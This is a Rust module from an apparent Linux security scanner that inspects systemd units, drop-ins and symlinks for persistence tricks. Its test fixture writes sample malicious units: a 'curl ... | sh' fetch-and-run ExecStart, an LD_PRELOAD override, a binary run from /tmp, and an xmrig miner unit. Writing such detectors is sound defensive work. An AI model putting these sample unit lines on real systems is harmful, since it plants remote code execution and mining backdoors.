//! systemd units, timers and drop-ins.

use std::collections::HashSet;
use std::path::{Path, PathBuf};

use super::{file_name, finish, logical_lines, snip};
use crate::ctx::Ctx;
use crate::finding::{Acc, Finding, Severity};
use crate::patterns;
use crate::pkg::Ownership;
use crate::util::fs::in_temp;
use crate::util::shell_quote;

const NAME: &str = "systemd";

const UNIT_EXT: &[&str] = &[".service", ".timer", ".socket", ".path", ".target", ".mount", ".automount", ".swap", ".slice"];
const EXEC_KEYS: &[&str] = &["ExecStart", "ExecStartPre", "ExecStartPost", "ExecStop", "ExecStopPost", "ExecReload", "ExecCondition"];
pub const SYSTEM_DIRS: &[&str] = &[
    "/etc/systemd/system",
    "/usr/lib/systemd/system",
    "/lib/systemd/system",
    "/usr/local/lib/systemd/system",
    "/etc/systemd/user",
    "/usr/lib/systemd/user",
    "/lib/systemd/user",
    "/usr/local/lib/systemd/user",
];
pub const HOME_DIRS: &[&str] = &[".config/systemd/user", ".local/share/systemd/user"];

#[derive(Clone)]
enum Scope {
    System,
    User(String),
}

struct Walk {
    files: Vec<(PathBuf, Scope)>,
    seen: HashSet<PathBuf>,
    findings: Vec<Finding>,
}

pub fn run(ctx: &Ctx) -> Vec<Finding> {
    let mut dirs: Vec<(PathBuf, Scope)> = SYSTEM_DIRS.iter().map(|d| (PathBuf::from(d), Scope::System)).collect();
    for h in &ctx.homes {
        for d in HOME_DIRS {
            dirs.push((h.path.join(d), Scope::User(h.user.clone())));
        }
    }
    // Canonical dirs (dedupes /lib → /usr/lib on usrmerge systems).
    let mut canon_dirs: Vec<(PathBuf, Scope)> = Vec::new();
    for (d, s) in dirs {
        if let Ok(c) = ctx.fs.resolve(&d, true) {
            if ctx.fs.is_dir(&c) && !canon_dirs.iter().any(|(x, _)| *x == c) {
                canon_dirs.push((c, s));
            }
        }
    }
    let roots: Vec<PathBuf> = canon_dirs.iter().map(|(d, _)| d.clone()).collect();
    let mut w = Walk { files: Vec::new(), seen: HashSet::new(), findings: Vec::new() };
    for (d, s) in &canon_dirs {
        collect(ctx, d, s, 0, &roots, &mut w);
    }
    let mut out = w.findings;
    for (path, scope) in &w.files {
        if let Some(f) = analyze(ctx, path, scope) {
            out.push(f);
        }
    }
    out
}

fn is_unit_name(n: &str) -> bool {
    UNIT_EXT.iter().any(|e| n.ends_with(e))
}

fn collect(ctx: &Ctx, dir: &Path, scope: &Scope, depth: usize, roots: &[PathBuf], w: &mut Walk) {
    let parent_is_dropin = dir.to_string_lossy().ends_with(".d");
    for child in ctx.list(dir) {
        let name = file_name(&child);
        let Ok(md) = ctx.fs.lstat(&child) else { continue };
        if md.is_dir() {
            if depth == 0 && [".wants", ".requires", ".upholds", ".d"].iter().any(|s| name.ends_with(s)) {
                collect(ctx, &child, scope, 1, roots, w);
            }
            continue;
        }
        let relevant = is_unit_name(&name) || (depth == 1 && parent_is_dropin && name.ends_with(".conf"));
        if !relevant {
            continue;
        }
        if md.file_type().is_symlink() {
            let Ok(target) = ctx.fs.resolve(&child, true) else { continue };
            if target == Path::new("/dev/null") {
                continue; // masked
            }
            if !ctx.fs.exists(&target) {
                continue; // dangling enablement link
            }
            if !roots.iter().any(|r| target.starts_with(r)) {
                let sev = if in_temp(&target.to_string_lossy()) { Severity::High } else { Severity::Med };
                w.findings.push(Finding::new(
                    NAME,
                    sev,
                    ctx.disp(&child),
                    Ctx::key("systemd-link", &child),
                    format!("unit symlink points outside the standard unit directories → {}", target.display()),
                    format!("Review: ls -l {} && less {}\nIf unwanted: {}rm -i {}", ctx.q(&child), ctx.q(&target), sudo(scope), ctx.q(&child)),
                ));
                ctx.record(Ctx::key("systemd-link", &child), target.to_string_lossy().into_owned(), false);
            }
            if w.seen.insert(target.clone()) {
                w.files.push((target, scope.clone()));
            }
        } else if md.is_file() && w.seen.insert(child.clone()) {
            w.files.push((child, scope.clone()));
        }
    }
}

fn sudo(scope: &Scope) -> &'static str {
    match scope {
        Scope::System => "sudo ",
        Scope::User(_) => "",
    }
}

/// Unit name for a unit file or a drop-in (`foo.service.d/x.conf` → `foo.service`).
fn unit_name(path: &Path) -> String {
    let n = file_name(path);
    if n.ends_with(".conf") {
        if let Some(p) = path.parent() {
            let pn = file_name(p);
            if let Some(u) = pn.strip_suffix(".d") {
                return u.to_string();
            }
        }
    }
    n
}

/// Analyze unit text; returns accumulated suspicious hits.
pub fn analyze_text(text: &str) -> Acc {
    let mut acc = Acc::default();
    for (ln, line) in logical_lines(text, &['#', ';']) {
        if line.starts_with('[') {
            continue;
        }
        let Some((k, v)) = line.split_once('=') else { continue };
        let (k, v) = (k.trim(), v.trim());
        if EXEC_KEYS.contains(&k) {
            if v.is_empty() {
                continue;
            }
            let cmd = v.trim_start_matches(|c| "-@:+!|".contains(c));
            if let Some(bin) = cmd.split_whitespace().next() {
                if let Some((s, r)) = patterns::exec_location(bin) {
                    acc.add(s, format!("line {ln}: {k} {r}"));
                }
            }
            for h in patterns::scan(cmd) {
                acc.add(h.sev, format!("line {ln}: {k}: {} [{}]", h.what, snip(cmd)));
            }
        } else if k == "Environment" || k == "EnvironmentFile" || k == "PassEnvironment" {
            if v.contains("LD_PRELOAD") {
                acc.add(Severity::High, format!("line {ln}: sets LD_PRELOAD for the service"));
            } else if v.contains("LD_LIBRARY_PATH") {
                acc.add(Severity::Med, format!("line {ln}: sets LD_LIBRARY_PATH for the service"));
            }
            if k == "EnvironmentFile" && in_temp(v.trim_start_matches('-')) {
                acc.add(Severity::High, format!("line {ln}: EnvironmentFile in a temp dir: {v}"));
            }
        }
    }
    acc
}

fn analyze(ctx: &Ctx, path: &Path, scope: &Scope) -> Option<Finding> {
    let text = ctx.read_text(path)?;
    let owner = match scope {
        Scope::System => ctx.owner(path),
        Scope::User(_) => Ownership::Unknown,
    };
    let key = Ctx::key(NAME, path);
    ctx.record_file(&key, path, matches!(owner, Ownership::Owned(_)));
    let mut acc = analyze_text(&text);
    let ps = path.to_string_lossy();
    let base = if ps.starts_with("/usr/lib/") || ps.starts_with("/lib/") { Severity::Med } else { Severity::Low };
    if let Scope::User(_) = scope {
        acc.add(Severity::Low, "user-level unit (runs with the user's privileges, e.g. at login)");
    }
    let name = unit_name(path);
    let live = ctx.live;
    let root = ctx.fs.root().to_string_lossy().into_owned();
    let q = ctx.q(path);
    let scope2 = scope.clone();
    let mut f = finish(ctx, NAME, path, acc, &owner, matches!(scope, Scope::System).then_some(base), move |_| {
        let n = shell_quote(&name);
        match (&scope2, live) {
            (Scope::System, true) => format!("Review: systemctl cat {n}\nIf unwanted: sudo systemctl disable --now {n} && sudo rm -i {q} && sudo systemctl daemon-reload"),
            (Scope::System, false) => format!("Review: less {q}\nIf unwanted (offline): sudo systemctl --root={} disable {n}; sudo rm -i {q}", shell_quote(&root)),
            (Scope::User(u), true) => format!("As user {u}: systemctl --user cat {n}\nIf unwanted: systemctl --user disable --now {n} && rm -i {q} && systemctl --user daemon-reload"),
            (Scope::User(_), false) => format!("Review: less {q}\nIf unwanted: rm -i {q} (and remove any symlinks to it in *.wants/)"),
        }
    })?;
    if let Scope::User(u) = scope {
        f.reason = format!("{} (user {u})", f.reason);
    }
    Some(f)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::testutil::{find, run_check};
    use crate::util::fs::testutil::FakeRoot;

    #[test]
    fn flags_suspicious_and_unowned_units() {
        let r = FakeRoot::new("systemd");
        // Fake pacman db owning one unit.
        r.write("/var/lib/pacman/local/openssh-9-1/desc", "%NAME%\nopenssh\n");
        r.write("/var/lib/pacman/local/openssh-9-1/files", "%FILES%\nusr/lib/systemd/system/sshd.service\n");
        r.write("/usr/lib/systemd/system/sshd.service", "[Service]\nExecStart=/usr/bin/sshd -D\n");
        r.write("/usr/lib/systemd/system/sneaky.service", "[Service]\nExecStart=/usr/bin/true\n");
        r.write("/etc/systemd/system/evil.service", "[Service]\nExecStart=/bin/bash -c 'curl -s http://x | sh'\n");
        r.write("/etc/systemd/system/tmp.service", "[Service]\nExecStart=-/tmp/.x/run\n");
        r.write("/etc/systemd/system/plain.service", "[Service]\nExecStart=/usr/bin/true\n");
        r.write("/etc/systemd/system/getty@.service.d/override.conf", "[Service]\nEnvironment=LD_PRELOAD=/usr/lib/x.so\n");
        r.symlink("/usr/lib/systemd/system/sshd.service", "/etc/systemd/system/multi-user.target.wants/sshd.service");
        r.symlink("/dev/null", "/etc/systemd/system/masked.service");
        r.write("/opt/hidden.service", "[Service]\nExecStart=/usr/bin/true\n");
        r.symlink("/opt/hidden.service", "/etc/systemd/system/multi-user.target.wants/hidden.service");
        r.write("/home/bob/.config/systemd/user/miner.service", "[Service]\nExecStart=%h/.cache/.m/xmrig\n");
        r.write("/etc/passwd", "bob:x:1000:1000::/home/bob:/bin/bash\n");

        let (_, v) = run_check(&r, run);
        assert_eq!(find(&v, "evil.service").unwrap().severity, Severity::High);
        assert_eq!(find(&v, "tmp.service").unwrap().severity, Severity::High);
        assert_eq!(find(&v, "plain.service").unwrap().severity, Severity::Low);
        assert_eq!(find(&v, "sneaky.service").unwrap().severity, Severity::Med);
        assert!(find(&v, "/usr/lib/systemd/system/sshd.service").is_none(), "owned clean unit must not be flagged");
        assert_eq!(find(&v, "override.conf").unwrap().severity, Severity::High);
        assert!(find(&v, "masked.service").is_none());
        let link = find(&v, "wants/hidden.service").unwrap();
        assert!(link.reason.contains("outside"));
        let miner = find(&v, "miner.service").unwrap();
        assert_eq!(miner.severity, Severity::Med);
        assert!(miner.fix.contains("systemctl --user") || miner.fix.contains("rm -i"));
    }
}
